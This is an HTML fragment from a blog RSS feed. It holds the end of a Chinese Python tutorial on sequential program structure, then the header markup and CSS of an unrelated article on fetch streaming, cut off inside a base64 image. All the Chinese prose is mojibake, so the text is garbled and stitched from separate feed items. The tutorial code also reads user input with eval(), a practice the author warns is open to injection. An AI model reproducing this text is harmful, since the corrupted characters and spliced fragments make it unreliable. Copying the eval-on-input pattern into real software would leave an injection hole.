<p>åœ¨å·¥ç¨‹å®è·µä¸­ï¼Œä»£ç å®ç°åªæ˜¯æœ€åçš„ä¸€ç¯ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§ä¸å…·ä½“è¯­è¨€æ— å…³çš„æ–¹å¼æ¥æè¿°ç®—æ³•é€»è¾‘ã€‚æ–‡ä¸­æåˆ°çš„ä¸‰ç§æ–¹å¼ï¼Œåˆ†åˆ«å¯¹åº”äº†ä¸åŒåœºæ™¯ä¸‹çš„éœ€æ±‚ï¼š</p>
<h4 data-id="heading-1">1. IPOæ¨¡å‹ï¼šæ•°æ®æµçš„æœ¬è´¨</h4>
<p>Input -&gt; Process -&gt; Outputã€‚è¿™ä¸ä»…æ˜¯ç¼–å†™Pythonç¨‹åºçš„æ­¥éª¤ï¼Œæ›´æ˜¯æ‰€æœ‰æ•°æ®å¤„ç†çš„é€šç”¨èŒƒå¼ã€‚å®ƒæé†’æˆ‘ä»¬ï¼š<strong>ä¸è¦ä¸€ä¸Šæ¥å°±å†™ä»£ç ï¼Œå…ˆææ¸…æ¥šè¾“å…¥æ˜¯ä»€ä¹ˆï¼Œè¦è¾“å‡ºä»€ä¹ˆ</strong>ã€‚</p>
<h4 data-id="heading-2">2. æµç¨‹å›¾ï¼šé€»è¾‘çš„å¯è§†åŒ–</h4>
<p>æµç¨‹å›¾é€šè¿‡æ ‡å‡†çš„ç¬¦å·ï¼ˆèµ·æ­¢æ¡†ã€åˆ¤æ–­æ¡†ç­‰ï¼‰å°†é€»è¾‘å…·è±¡åŒ–ã€‚</p>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå‘éæŠ€æœ¯äººå‘˜è§£é‡Šé€»è¾‘ï¼Œæˆ–è€…ç”¨äºå¤æ‚çš„ç®—æ³•è®¾è®¡è¯„å®¡ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caeb9037619242b986c60a804c8d1daf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG92ZV9zdW1tZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768401018&amp;x-signature=LFOCHKipGbSYuXjLP26hTjyE9LQ%3D" alt="image.png" loading="lazy"/></li>
</ul>
<h4 data-id="heading-3">3. ä¼ªä»£ç ï¼šè¯­è¨€çš„æ— å…³æ€§</h4>
<p>ä¼ªä»£ç æ˜¯é€»è¾‘çš„â€œéª¨æ¶â€ã€‚å®ƒå‰¥ç¦»äº†è¯­æ³•çš„ç»†èŠ‚ï¼Œåªä¿ç•™ç®—æ³•æ ¸å¿ƒã€‚ä¾‹å¦‚è®¡ç®—åœ†çš„é¢ç§¯ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cb8c4c717b2434b81aa4b37331bc396~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG92ZV9zdW1tZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768401018&amp;x-signature=z2%2BPmSRUGtH1v9unWTNrDvhxwec%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥å…ˆä¸“æ³¨äºç®—æ³•çš„æ­£ç¡®æ€§ï¼Œå†è€ƒè™‘å…·ä½“çš„å®ç°ç»†èŠ‚ã€‚</p>
</blockquote>
<h3 data-id="heading-4">äºŒã€é¡ºåºæ‰§è¡Œä¸Pythonçš„è¯­æ³•ç³–</h3>
<p>é¡ºåºç»“æ„æ˜¯æ‰€æœ‰ç¼–ç¨‹è¯­è¨€é»˜è®¤çš„æ‰§è¡Œæµï¼š<code>Statement1 -&gt; Statement2 -&gt; Statement3</code>ã€‚ä½†åœ¨Pythonä¸­ï¼Œç”±äºå…¶å¯¹èµ‹å€¼æ“ä½œçš„å¼ºå¤§æ”¯æŒï¼Œé¡ºåºç»“æ„å†™èµ·æ¥æ ¼å¤–â€œæ€§æ„Ÿâ€ã€‚</p>
<h4 data-id="heading-5">2.1 é“¾å¼èµ‹å€¼</h4>
<pre><code class="hljs language-python" lang="python">a = b = c = <span class="hljs-number">100</span>
</code></pre>
<p>è¿™ä¸ä»…å‡å°‘äº†ä»£ç è¡Œæ•°ï¼Œæ›´é‡è¦çš„æ˜¯å®ƒä¿è¯äº†å¤šä¸ªå˜é‡å¼•ç”¨çš„æ˜¯<strong>åŒä¸€ä¸ªå†…å­˜å¯¹è±¡</strong>ï¼ˆå¯¹äºä¸å¯å˜å¯¹è±¡å¦‚æ•´æ•°ï¼‰ã€‚</p>
<h4 data-id="heading-6">2.2 åºåˆ—è§£åŒ…</h4>
<p>è¿™æ˜¯PythonåŒºåˆ«äºC/Javaçš„ä¸€å¤§ç‰¹è‰²ã€‚</p>
<pre><code class="hljs language-python" lang="python">a, b, c, d = <span class="hljs-string">'room'</span>  <span class="hljs-comment"># å­—ç¬¦ä¸²ä¹Ÿæ˜¯åºåˆ—</span>
</code></pre>
<ul>
<li><strong>åŸç†</strong>ï¼šç­‰å·å³è¾¹æ˜¯ä¸€ä¸ªåºåˆ—ï¼Œå·¦è¾¹æ˜¯å¯¹åº”æ•°é‡çš„å˜é‡ã€‚Pythonä¼šå°†åºåˆ—å…ƒç´ ä¾æ¬¡èµ‹å€¼ç»™å·¦è¾¹çš„å˜é‡ã€‚</li>
<li><strong>åº”ç”¨</strong>ï¼šè¿™ä¸ªç‰¹æ€§éå¸¸å¼ºå¤§ï¼Œå¸¸ç”¨äºå‡½æ•°å¤šè¿”å›å€¼çš„æ¥æ”¶ã€å˜é‡äº¤æ¢ï¼ˆ<code>a, b = b, a</code>ï¼‰ç­‰åœºæ™¯ã€‚</li>
</ul>
<h4 data-id="heading-7">2.3 è¾“å…¥ä¸ç±»å‹è½¬æ¢</h4>
<p>åœ¨Pythonä¸­ï¼Œ<code>input()</code> æ°¸è¿œè¿”å›å­—ç¬¦ä¸²ã€‚ä¸ºäº†è·å–æ•°å€¼å‹æ•°æ®ï¼Œæ–‡ä¸­ä½¿ç”¨äº† <code>eval()</code>ï¼š</p>
<pre><code class="hljs language-python" lang="python">age = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å¹´é¾„:'</span>))
</code></pre>
<ul>
<li><strong>æ³¨æ„</strong>ï¼š<code>eval()</code> å‡½æ•°ä¼šæ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„Pythonè¡¨è¾¾å¼ï¼Œè™½ç„¶æ–¹ä¾¿ï¼Œä½†åœ¨å¤„ç†ä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥æ—¶å­˜åœ¨å®‰å…¨é£é™©ï¼ˆå¦‚æ³¨å…¥æ”»å‡»ï¼‰ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå»ºè®®ä½¿ç”¨ <code>int()</code> æˆ– <code>float()</code> è¿›è¡Œæ˜¾å¼ç±»å‹è½¬æ¢ã€‚</li>
</ul>
<h3 data-id="heading-8">ä¸‰ã€ä»£ç å®æˆ˜</h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶µç›–äº†èµ‹å€¼ã€è§£åŒ…ã€è¾“å…¥è¾“å‡ºçš„å®Œæ•´ç¤ºä¾‹ï¼ˆç¤ºä¾‹4-1ï¼‰ï¼Œå±•ç¤ºäº†Pythoné¡ºåºç»“æ„çš„å…¸å‹å†™æ³•ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-comment"># èµ‹å€¼ä¸é“¾å¼èµ‹å€¼</span>
name = <span class="hljs-string">'ç‹æ°'</span>
a = b = c = d = <span class="hljs-number">100</span>
<span class="hljs-comment"># åºåˆ—è§£åŒ…</span>
a, b, c, d = <span class="hljs-string">'room'</span>
<span class="hljs-comment"># äº¤äº’å¼è¾“å…¥ä¸è¾“å‡º</span>
name = <span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å§“å:'</span>)
<span class="hljs-comment"># æ¨èå†™æ³•ï¼šage = int(input(...))</span>
age = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å¹´é¾„:'</span>)) 
lucky_number = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'è¯·è¾“å…¥æ‚¨çš„å¹¸è¿æ•°å­—:'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å§“å:'</span>, name)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å¹´é¾„:'</span>, age)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å¹¸è¿æ•°å­—:'</span>, lucky_number)
</code></pre>
<p><strong>è¿è¡Œæ•ˆæœï¼š</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cc275b2d3b94a7c887fa3ee39217aba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG92ZV9zdW1tZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768401018&amp;x-signature=prozDyINHWo0paG%2FrH7VJazWlks%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">æ€»ç»“</h3>
<h2 data-id="heading-10">é¡ºåºç»“æ„è™½ç„¶ç®€å•ï¼Œä½†ç»“åˆPythonçš„<strong>é“¾å¼èµ‹å€¼</strong>å’Œ<strong>åºåˆ—è§£åŒ…</strong>ï¼Œèƒ½å†™å‡ºéå¸¸ä¼˜é›…çš„ä»£ç ã€‚æŒæ¡å¥½è¿™äº›åŸºç¡€ç‰¹æ€§ï¼Œæ˜¯ç¼–å†™é«˜è´¨é‡Pythonä»£ç çš„ç¬¬ä¸€æ­¥ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°†æ¢è®¨<strong>é€‰æ‹©ç»“æ„ï¼ˆåˆ†æ”¯ï¼‰</strong>ï¼Œçœ‹çœ‹Pythonæ˜¯å¦‚ä½•å¤„ç†é€»è¾‘åˆ¤æ–­çš„ã€‚</h2></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ¬¡çœŸå®çš„æµå¼è¸©å‘ï¼šfetchEventSource vs fetchæµè¯»å–çš„æœ¬è´¨åŒºåˆ«]]></title>    <link>https://juejin.cn/post/7592507671083483146</link>    <guid>https://juejin.cn/post/7592507671083483146</guid>    <pubDate>2026-01-08T01:45:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592507671083483146" data-draft-id="7592438587389362214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ¬¡çœŸå®çš„æµå¼è¸©å‘ï¼šfetchEventSource vs fetchæµè¯»å–çš„æœ¬è´¨åŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T01:45:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é»‘åœŸè±†"/> <meta itemprop="url" content="https://juejin.cn/user/3421335917433006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ¬¡çœŸå®çš„æµå¼è¸©å‘ï¼šfetchEventSource vs fetchæµè¯»å–çš„æœ¬è´¨åŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3421335917433006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é»‘åœŸè±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:45:27.000Z" title="Thu Jan 08 2026 01:45:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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